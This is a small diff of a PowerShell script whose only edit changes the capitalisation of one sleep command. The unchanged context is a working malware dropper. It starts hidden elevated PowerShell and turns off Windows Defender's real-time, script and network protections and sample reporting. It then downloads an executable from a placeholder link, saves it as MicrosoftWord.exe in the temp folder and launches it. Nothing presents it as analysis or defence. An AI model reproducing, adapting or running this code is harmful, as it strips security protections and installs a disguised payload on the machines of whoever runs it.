@@ -8,7 +8,7 @@ Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "
 Start-Sleep -s 300
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
-Start-Sleep -s 1800
+Start-sleep -s 1800
 Start-Process -FilePath "powershell" -Verb
 RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
 Start-Process -FilePath %TEMP%\MicrosoftWord.exe" "
